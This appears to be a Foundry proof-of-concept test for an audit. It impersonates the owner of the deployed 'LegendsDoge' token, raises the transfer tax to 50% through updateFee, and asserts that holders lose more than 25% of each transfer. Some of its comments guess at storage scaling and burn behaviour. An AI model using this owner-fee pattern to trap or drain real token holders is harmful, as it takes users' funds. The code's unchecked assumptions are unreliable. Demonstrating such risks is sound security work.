```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILegendsDoge {
    function updateFee(uint256 _txFee, uint256 _burnFee, uint256 _charityFee) external;
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function _TAX_FEE() external view returns (uint256);
    function _BURN_FEE() external view returns (uint256);
    function _CHARITY_FEE() external view returns (uint256);
    function _maxTxAmount() external view returns (uint256);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function setMaxWalletPercent(uint256 maxWalletPercent) external;
    function isExcluded(address account) external view returns (bool);
    function isCharity(address account) external view returns (bool);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    ILegendsDoge constant target = ILegendsDoge(0xCd092F1f9858204d7986b3a2e36730fF1229a2e5);
    address owner;
    address user1 = address(0x1);
    address user2 = address(0x2);

    function setUp() public {
        // Label for clarity
        vm.label(address(target), "LegendsDoge");
        owner = target.owner();
        vm.label(owner, "Owner");

        // Fund user1 by transferring tokens from owner
        vm.startPrank(owner);
        target.transfer(user1, 1000 * 10**9);
        vm.stopPrank();
    }

    function test_ownerCanSetExcessiveFees() public {
        // Record initial balances
        uint256 user1Bal = target.balanceOf(user1);
        uint256 user2Bal = target.balanceOf(user2);
        // Owner calls updateFee to set fees beyond 25% (e.g., 50% tax, 0 burn, 0 charity)
        vm.prank(owner);
        target.updateFee(5000, 0, 0); // txFee=5000 -> effective 50% fee

        // Verify fees are updated (optional)
        assertEq(target._TAX_FEE(), 5000 * 100); // stored as input * 100

        // user1 transfers 1000 tokens to user2
        vm.prank(user1);
        target.transfer(user2, 1000 * 10**9);

        // Expected transfer: fee = 50% of 1000 = 500 tokens, so user2 should get ~500 tokens
        uint256 expectedTransfer = 1000 * 10**9 * 50 / 100; // 50% of amount
        uint256 expectedUser2Balance = user2Bal + expectedTransfer;
        uint256 actualUser2Balance = target.balanceOf(user2);

        // Assert that user2 received less than or equal to half (due to rounding)
        assertApproxEqAbs(actualUser2Balance, expectedUser2Balance, 1e9);

        // Additionally, user1 balance decreased by full 1000, but some burned? We set burn=0, so only tax.
        // The tax is reflected, not burned. So user1 balance should be reduced by 1000.
        uint256 user1BalAfter = target.balanceOf(user1);
        assertEq(user1BalAfter, user1Bal - 1000 * 10**9);

        // Now demonstrate that the fee exceeds 25% - we can directly compute fee taken
        uint256 feeTokensTaken = (1000 * 10**9) - (actualUser2Balance - user2Bal);
        // feeTokensTaken should be >= 250 * 10**9 (25% of 1000)
        assertGe(feeTokensTaken, 250 * 10**9, "Fee should be > 25%");
    }
}
```
